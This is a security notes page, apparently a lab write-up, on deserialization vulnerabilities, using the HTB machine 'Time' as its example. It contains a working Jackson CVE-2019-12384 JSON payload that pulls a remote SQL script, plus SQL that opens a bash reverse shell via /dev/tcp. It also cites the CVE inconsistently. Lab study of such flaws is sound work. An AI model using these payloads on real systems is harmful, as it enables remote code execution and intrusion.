# Deserialization

Deserialization vulnerabilities occur when a website handles and decodes **unsanitised user-input** (like cookies), allowing for attackers to inject code. 

## Unserialize then Serialize

Here's a workflow diagram of how objects could be processed in a web application:

<figure><img src="../.gitbook/assets/image (2597).png" alt=""><figcaption><p><em>Taken from Portswigger Web Security Academy</em></p></figcaption></figure>

Suppose that a PHP website (that I have the source code to) checks for a `user_cookie` variable, and not present, it would call `serialize()` to create it. If present, it calls `unserialize()` to process it and check for variables like `usernames`.

This usage of `unserialize()` is dangerous since it allows for code execution if given a specific `user_cookie` value, allowing for attackers to send in malicious payloads to be deserialized.

Most of the time, the flaw comes from the general lack of understanding of how dangerous deserializing user-controllable data can be. Ideally, user input should **never be deserialized at all**.&#x20;

This kind of attack mainly leads to RCE or DoS conditions on a website.

## Example

The HTB machine, Time, has a deserialization in Java making use of CVE-2021-12384. The machine has a JSON beautifier web application.

<figure><img src="../.gitbook/assets/image (2458).png" alt=""><figcaption></figcaption></figure>

If some non-JSON input is entered, it returns this error

<figure><img src="../.gitbook/assets/image (1970).png" alt=""><figcaption></figcaption></figure>

So, the website uses Jackson to execute the function. Jackson is vulnerable to CVE-2019-12384 for this particular machine, which is an RCE exploit involving passing a specific JSON object for RCE:

```
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"}]
```

The payload above exploits SSRF and makes the machine send a request to an attacker-specified URL and run any SQL scripts downloaded. The script below executes a reverse shell:

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
   String[] command = {"bash", "-c", cmd};
   java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
   return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"')
```